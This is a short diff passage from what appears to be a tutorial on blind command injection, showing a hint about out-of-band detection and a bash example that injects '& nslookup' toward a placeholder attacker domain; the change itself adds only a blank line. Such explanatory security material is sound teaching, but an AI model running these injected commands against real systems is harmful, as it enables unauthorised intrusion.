@@ -21,6 +21,7 @@ However, there’s no output of our command in the response, it might be vulnera
 💡 We can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
 {% endhint %}
 
+
 ```bash
 & nslookup kgji2ohoyw.web-attacker.com &
 
